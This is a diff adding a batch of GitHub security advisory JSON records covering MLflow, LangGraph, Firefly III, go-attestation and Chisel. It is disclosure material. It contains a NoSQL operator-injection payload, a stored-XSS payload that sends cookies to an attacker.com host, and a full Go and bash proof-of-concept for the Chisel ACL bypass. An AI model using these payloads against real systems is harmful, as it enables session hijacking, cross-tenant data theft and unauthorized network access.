@@ -565,3 +565,383 @@
     }
   }
 ]
+[Fri Jun 12 15:25:55 UTC 2026] Latest CVEs:
+[
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-w5xq-c4pf-ghq7",
+    "modified": "2026-06-12T15:05:41Z",
+    "published": "2026-05-21T06:31:31Z",
+    "aliases": [
+      "CVE-2026-2734"
+    ],
+    "summary": "MLflow authenticated users can enumerate any registered model versions due to lack of per-model permissions checks",
+    "details": "In mlflow/mlflow versions up to 3.9.0, the `SearchModelVersions` REST API endpoint and the `mlflowSearchModelVersions` GraphQL query lack proper per-model authorization checks when basic authentication is enabled. This allows any authenticated user to enumerate all model versions across all registered models, regardless of their permission level. The issue arises due to the absence of `SearchModelVersions` in the `BEFORE_REQUEST_VALIDATORS` and `AFTER_REQUEST_HANDLERS` for the REST API, and its omission from `GraphQLAuthorizationMiddleware.PROTECTED_FIELDS` for GraphQL. This vulnerability can expose sensitive information such as model names, version descriptions, source URIs, tags, and other metadata, potentially revealing proprietary or confidential details in multi-tenant environments. The issue is resolved in version 3.10.0.",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "PyPI",
+          "name": "mlflow"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.10.0"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-2734"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/mlflow/mlflow/commit/6989066af33fdcb03588fd71a1a67f8fc5ef12c9"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/mlflow/mlflow"
+      },
+      {
+        "type": "WEB",
+        "url": "https://huntr.com/bounties/d632f783-b2c7-4a3b-af5e-1d693e841c08"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-284"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-12T15:05:41Z",
+      "nvd_published_at": "2026-05-21T05:16:22Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-w5xq-c4pf-ghq7"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-98xf-r82g-9mhx",
+    "modified": "2026-06-12T15:05:32Z",
+    "published": "2026-06-12T15:05:32Z",
+    "aliases": [
+      "CVE-2026-48121"
+    ],
+    "summary": "LangGraph has NoSQL parameter injection in MongoDBSaver, allowing cross-tenant state access",
+    "details": "## Summary\n\nA NoSQL injection vulnerability existed in `MongoDBSaver` where checkpoint identifier fields from `config.configurable` were used in MongoDB queries without strict type enforcement. In vulnerable versions, attacker-controlled object payloads (for example MongoDB operators like `$gt` and `$ne`) could be interpreted as query operators instead of literal identifier values.\n\nThis could bypass intended thread scoping and return checkpoints from other tenants.\n\n## Attack surface\n\nThe vulnerable path was in `MongoDBSaver.getTuple()`, where `thread_id`, `checkpoint_ns`, and `checkpoint_id` were used in MongoDB `find()` queries. The same unvalidated values were then reused to fetch pending writes.\n\nApplications were exposed when untrusted input was forwarded into `config.configurable` (for example, directly from request bodies or query parameters) without string coercion or schema validation.\n\n## Who is affected?\n\nApplications are vulnerable if they:\n\n- Use `@langchain/langgraph-checkpoint-mongodb` with multi-tenant or user-isolated thread models.\n- Accept user-controlled values for `thread_id`, `checkpoint_ns`, or `checkpoint_id`.\n- Pass those values into `app.invoke()`, `app.stream()`, or direct saver methods without validation.\n\nApplications are generally not vulnerable if they:\n\n- Use server-issued identifiers only.\n- Source `thread_id` from trusted URL params that remain strings.\n- Enforce schema validation that rejects non-string identifier fields.\n\n## Impact\n\nAn attacker with control over configurable checkpoint identifiers could read checkpoint data outside their authorized thread boundary.\n\nPotentially exposed data includes:\n\n- Checkpoint state\n- Metadata\n- Pending writes\n\nThis is a confidentiality issue with cross-tenant data disclosure risk.\n\n## Exploit example\n\nAn attacker-controlled request can inject MongoDB operators:\n\n```ts\ngraph = new StateGraph(...)\n  .compile({\n    checkpointer: new MongoDBSaver()\n  });\n\ngraph.invoke(..., {\n  configurable: {  \n    \"thread_id\": { \"$gt\": \"\" },\n    \"checkpoint_ns\": { \"$ne\": null }\n  }\n});\n```\n\nIf this payload is forwarded into `config.configurable`, the resulting query may match checkpoints outside the intended tenant/thread scope.\n\n## Security hardening changes\n\nVersion `1.3.1` hardens `@langchain/langgraph-checkpoint-mongodb` by adding runtime validation for configurable checkpoint identifiers and rejecting invalid values before MongoDB query/write paths execute.\n\nThe patch also includes regression tests covering object/operator payloads across affected methods.\n\n## Migration guide\n\nUpgrade to `@langchain/langgraph-checkpoint-mongodb@1.3.1` or later.\n\nNo API migration is required for valid callers. However, applications that currently pass non-string identifier values in `config.configurable` will now receive explicit errors and should normalize/validate inputs.\n\nAs defense in depth, validate identifier fields at API boundaries and avoid passing raw client objects into graph config.\n\n## Resources\n\n- Issue: https://github.com/langchain-ai/langgraphjs/issues/2351\n- Fix PR: https://github.com/langchain-ai/langgraphjs/pull/2397",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@langchain/langgraph-checkpoint-mongodb"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.3.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 1.3.0"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/langchain-ai/langgraphjs/security/advisories/GHSA-98xf-r82g-9mhx"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/langchain-ai/langgraphjs/issues/2351"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/langchain-ai/langgraphjs/pull/2397"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/langchain-ai/langgraphjs/commit/284226c7ca164b3c81fe2d9e32b10f1fc6b99a3c"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/langchain-ai/langgraphjs"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-943"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-12T15:05:32Z",
+      "nvd_published_at": null
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-98xf-r82g-9mhx"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-6jq6-x4cx-qvcm",
+    "modified": "2026-06-12T15:04:50Z",
+    "published": "2026-06-12T15:04:50Z",
+    "aliases": [],
+    "summary": "Firefly II has Stored XSS in Audit Log Entry view via piggy bank name (ale.twig)",
+    "details": "## Summary\n\nThe Twig template `resources/views/list/ale.twig` renders the piggy bank name from `AuditLogEntry.after.piggy` using the `|raw` filter, bypassing Twig's auto-escaping. A piggy bank created with an HTML payload in its name executes arbitrary JavaScript in any browser viewing that transaction's audit log.\n\n## Root Cause\n\nThe `|raw` filter is required on the outer `trans()` call to preserve `<span>` tags in the `amount` parameter (currency styling). However, this also disables escaping for the user-controlled `name` parameter.\n\n**Vulnerable code (`resources/views/list/ale.twig` lines 107, 110):**\n```twig\n{{ trans('firefly.ale_action_log_add', {\n    amount: formatAmountBySymbol(...),\n    name: logEntry.after.piggy\n})|raw }}\n```\n\nNo HTML sanitization at storage time — `PiggyBankStoreRequest` only validates `min:1|max:255|uniquePiggyBankForUser`.\n\n## Data Flow\n\n```\nPOST /api/v1/piggy-banks {\"name\": \"<img src=x onerror=...>\"}\n  → Stored verbatim in piggy_banks.name\n  → Transaction rule fires add_to_piggy / remove_from_piggy\n  → UpdatePiggyBank::handle() stores AuditLogEntry.after.piggy = raw name\n  → Any user views /transactions/show/{id}\n  → ale.twig outputs unescaped payload → XSS fires\n```\n\n## CSP Note\n\nThe nonce-based CSP (`script-src 'nonce-...' 'strict-dynamic'`) does **not** prevent this attack. Inline event handlers (`onerror`, `onload`) in HTML attributes are governed by `script-src-attr`, which is unrestricted in the current policy. The `<img onerror=...>` payload bypasses the nonce requirement entirely.\n\n## PoC\n\n1. Authenticate as any user\n2. `POST /api/v1/piggy-banks` with `\"name\": \"<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>\"`\n3. Create a rule: action = \"Add money to piggy bank [attacker's piggy bank]\"\n4. Trigger the rule on any transaction\n5. Visit `/transactions/show/{id}` → payload fires\n\n**Confirmed server response (v6.6.2):**\n```html\nAdded <span class=\"text-success money-positive\">EUR 50.00</span> to piggy bank\n\"<img src=x onerror=alert(document.cookie)>\"\n```\n\n## Impact\n\n- Stored XSS persists in DB — fires for every user who views the transaction\n- Cookie theft → session hijacking\n- In multi-user setups: one user attacks another user or admin\n- Chainable with CSRF-like operations\n\n## Fix\n\nPR #12271 (merged into `develop`): add `|e` to escape only the user-controlled `name` parameter.\n\n```twig\n{{ trans('firefly.ale_action_log_add', {\n    amount: formatAmountBySymbol(...),\n    name: logEntry.after.piggy|e\n})|raw }}\n```",
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Packagist",
+          "name": "grumpydictator/firefly-iii"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "6.6.3"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 6.6.2"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/firefly-iii/firefly-iii/security/advisories/GHSA-6jq6-x4cx-qvcm"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/firefly-iii/firefly-iii/pull/12271"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/firefly-iii/firefly-iii"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-116",
+        "CWE-79"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-12T15:04:50Z",
+      "nvd_published_at": null
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-6jq6-x4cx-qvcm"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-9r4w-jg96-92mv",
+    "modified": "2026-06-12T15:04:43Z",
+    "published": "2026-06-12T15:04:43Z",
+    "aliases": [],
+    "summary": "Go-Attestation: Hash injection into trusted measurement list via unskipped SignatureHeaderSize vendor bytes in parseEfiSignatureList()",
+    "details": "## Summary\n\n`parseEfiSignatureList()` in `attest/internal/events.go` does not skip `SignatureHeaderSize` vendor bytes before reading `EFI_SIGNATURE_LIST` signature entries, violating UEFI specification section 31.4.1.\n\n## Impact\n\nFor `hashSHA256SigGUID` lists, attacker-controlled vendor header bytes are appended directly to the trusted SHA256 hash list. A crafted TPM event log can inject arbitrary SHA256 hashes into the verifier's trusted measurement database, allowing a remote attestation verifier to accept a compromised boot state as legitimate — breaking the core integrity guarantee of remote attestation.\n\n## Root Cause\n\nAfter `binary.Read(&signatures.Header)` reads 28 bytes, `buf` points to the start of the `SignatureHeaderSize` vendor bytes. Both entry loops start at `sigOffset := 0` instead of `sigOffset := SignatureHeaderSize`, causing vendor bytes to be read as signature entries.\n\n## Affected versions\n\nAll versions through commit `f877374` (2026-05-15).\n\n## Fix\n\nPull request: https://github.com/google/go-attestation/pull/502\n\n- Add bound check: `SignatureHeaderSize` must not exceed remaining list space\n- Skip `SignatureHeaderSize` bytes before both entry loops\n- Regression test: `TestParseEfiSignatureListNonZeroSignatureHeaderSize`",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "github.com/google/go-attestation"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "last_affected": "0.5.0"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/google/go-attestation/security/advisories/GHSA-9r4w-jg96-92mv"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/google/go-attestation/pull/502"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/google/go-attestation/commit/b6e905e7ae52937f02b5ca494dd1c6a3ac7a1003"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/google/go-attestation"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/google/go-attestation/releases/tag/v0.6.0"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-20"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-12T15:04:43Z",
+      "nvd_published_at": null
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-9r4w-jg96-92mv"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-24fp-5v3p-rvpw",
+    "modified": "2026-06-12T15:04:37Z",
+    "published": "2026-06-12T15:04:37Z",
+    "aliases": [
+      "CVE-2026-48113"
+    ],
+    "summary": "Chisel has an ACL Bypass via Post-Handshake SSH Channel ExtraData Injection",
+    "details": "### Summary\n\nAuthenticated chisel clients can bypass `--authfile` ACL restrictions and tunnel traffic to arbitrary destinations reachable from the server. The ACL is enforced only during the initial handshake against declared remotes, but never on subsequent SSH channels that carry actual traffic. A malicious client authenticates with a permitted remote, then opens channels to any `host:port` it wants.\n\n\n### Details\nThe chisel server validates user ACLs in two places but is missing validation in one of the important places.\n\nThe `server/server_handler.go` checks the ACL, during the initial config handshake:\n\n```go\nfor _, r := range c.Remotes {\n    if user != nil {\n        addr := r.UserAddr()\n        if !user.HasAccess(addr) {\n            failed(s.Errorf(\"access to '%s' denied\", addr))\n            return\n        }\n    }\n}\nr.Reply(true, nil)\n```\n\nThis validates the declared remote list from the client's config request. It runs once, at connection setup. But in `share/tunnel/tunnel_out_ssh.go` ACL aren't being checked, when the server processes actual traffic channels:\n\n```go\nfunc (t *Tunnel) handleSSHChannel(ch ssh.NewChannel) {\n    remote := string(ch.ExtraData())        // client-controlled\n    hostPort, proto := settings.L4Proto(remote)\n    sshChan, reqs, err := ch.Accept()       // accepted unconditionally\n    // ...\n    err = t.handleTCP(l, stream, hostPort)  // dials whatever client said\n}\n\nfunc (t *Tunnel) handleTCP(l *cio.Logger, src io.ReadWriteCloser, hostPort string) error {\n    dst, err := net.Dial(\"tcp\", hostPort)   // no ACL check\n    // ...\n}\n```\n\nThe `tunnel.Config` struct has no User field, no allowed-address list, and no ACL callback. The user context from `server_handler.go` is never propagated to the tunnel layer:\n\n```go\ntype Config struct {\n    *cio.Logger\n    Inbound   bool\n    Outbound  bool\n    Socks     bool\n    KeepAlive time.Duration\n    // ------- No User, no AllowedRemotes, no ACL\n}\n```\nSince `ch.ExtraData()` is fully controlled by the SSH client, any authenticated user can open channels to arbitrary destinations after passing the handshake with a permitted remote.\n\n\n### PoC\n\nDirectory structure format:\n```\npoc\n├── poc.sh\n└── probe\n    ├── go.mod\n    ├── go.sum\n    └── main.go\n```\n\n- `poc.sh`\n\n```bash\n#!/usr/bin/env bash\n\n# Requires: Go, nc (netcat)\n\nset -euo pipefail\nDIR=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nREPO=\"$DIR/..\"\n\nfreeport() { python3 -c \"import socket;s=socket.socket();s.bind(('',0));print(s.getsockname()[1]);s.close()\"; }\ncleanup() { kill $SERVER $LISTENER 2>/dev/null; rm -f \"$AUTH\"; }\ntrap cleanup EXIT\n\n# Build\necho \"[*] Building...\"\n(cd \"$REPO\"       && go build -o /tmp/_chisel .)\n(cd \"$DIR/probe\"  && go build -o /tmp/_probe  .)\n\n# Ports\nSP=$(freeport); AP=$(freeport); BP=$(freeport)\necho \"[*] Server :$SP  Allowed :$AP  Blocked :$BP\"\n\n# Authfile — user:pass may only reach 127.0.0.1:$AP\nAUTH=$(mktemp)\nprintf '{\"user:pass\":[\"^127\\\\\\\\.0\\\\\\\\.0\\\\\\\\.1:%s$\"]}\\n' \"$AP\" > \"$AUTH\"\n\n# Start forbidden-target listener and chisel server\n(echo \"FORBIDDEN_TARGET_REACHED\" | nc -l 127.0.0.1 \"$BP\") & LISTENER=$!\n/tmp/_chisel server --port \"$SP\" --authfile \"$AUTH\" --key seed 2>/dev/null & SERVER=$!\nsleep 1\n\n# Exploit\nCHISEL_SERVER=\"127.0.0.1:$SP\" ALLOWED_PORT=\"$AP\" BLOCKED_PORT=\"$BP\" /tmp/_probe\n```\n\n- `main.go`\n\n```go\n// Chisel ACL bypass probe. Authenticates with an allowed remote,\n// then opens an SSH channel to a forbidden destination via ExtraData.\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"os\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n\t\"github.com/jpillora/chisel/share/cnet\"\n\t\"github.com/jpillora/chisel/share/settings\"\n\t\"golang.org/x/crypto/ssh\"\n)\n\nfunc main() {\n\tserver := os.Getenv(\"CHISEL_SERVER\")\n\tallowed := os.Getenv(\"ALLOWED_PORT\")\n\tblocked := os.Getenv(\"BLOCKED_PORT\")\n\n\t// WebSocket → net.Conn\n\tws, _, err := (&websocket.Dialer{\n\t\tHandshakeTimeout: 5 * time.Second,\n\t\tSubprotocols:     []string{\"chisel-v3\"},\n\t}).Dial(\"ws://\"+server, http.Header{})\n\tcheck(err, \"ws dial\")\n\tconn := cnet.NewWebSocketConn(ws)\n\n\t// SSH handshake\n\tsc, chans, reqs, err := ssh.NewClientConn(conn, \"\", &ssh.ClientConfig{\n\t\tUser:            \"user\",\n\t\tAuth:            []ssh.AuthMethod{ssh.Password(\"pass\")},\n\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\n\t})\n\tcheck(err, \"ssh\")\n\tgo ssh.DiscardRequests(reqs)\n\tgo func() { for c := range chans { c.Reject(ssh.Prohibited, \"\") } }()\n\n\t// Send config with only the allowed remote\n\tr, _ := settings.DecodeRemote(fmt.Sprintf(\"0.0.0.0:%s:127.0.0.1:%s\", allowed, allowed))\n\tcfg, _ := json.Marshal(settings.Config{Version: \"0\", Remotes: []*settings.Remote{r}})\n\tok, reply, err := sc.SendRequest(\"config\", true, cfg)\n\tcheck(err, \"config\")\n\tif !ok {\n\t\tdie(\"config rejected: %s\", reply)\n\t}\n\tfmt.Printf(\"[+] Config accepted (only 127.0.0.1:%s allowed)\\n\", allowed)\n\n\t// Open channel to BLOCKED destination\n\ttarget := net.JoinHostPort(\"127.0.0.1\", blocked)\n\tch, cr, err := sc.OpenChannel(\"chisel\", []byte(target))\n\tif err != nil {\n\t\tfmt.Printf(\"[-] REJECTED — server refused %s\\n\", target)\n\t\tos.Exit(1)\n\t}\n\tgo ssh.DiscardRequests(cr)\n\tfmt.Printf(\"[!] ACCEPTED — channel opened to %s\\n\", target)\n\n\t// Read response from forbidden target\n\tbuf := make([]byte, 256)\n\tdone := make(chan int, 1)\n\tgo func() { n, _ := ch.Read(buf); done <- n }()\n\tselect {\n\tcase n := <-done:\n\t\tif n > 0 {\n\t\t\tfmt.Printf(\"[!] Data: %s\\n\", buf[:n])\n\t\t}\n\tcase <-time.After(3 * time.Second):\n\t}\n\tfmt.Println(\"CONFIRMED — ACL bypass: server dialed unauthorized destination\")\n\tch.Close()\n\tsc.Close()\n}\n\nfunc check(err error, ctx string) {\n\tif err != nil {\n\t\tdie(\"%s: %v\", ctx, err)\n\t}\n}\nfunc die(f string, a ...interface{}) {\n\tfmt.Fprintf(os.Stderr, f+\"\\n\", a...)\n\tos.Exit(1)\n}\n```\n\n### Impact\n\n- Complete ACL bypass: The `--authfile` address restrictions are enforceable only on paper\n-  Authenticated users can reach any host/port the server process can dial",
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:H/SA:L"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "github.com/jpillora/chisel"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.11.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 1.11.4"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpillora/chisel/security/advisories/GHSA-24fp-5v3p-rvpw"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpillora/chisel"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-863"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-12T15:04:37Z",
+      "nvd_published_at": null
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-24fp-5v3p-rvpw"
+          }
+        ]
+      }
+    }
+  }
+]
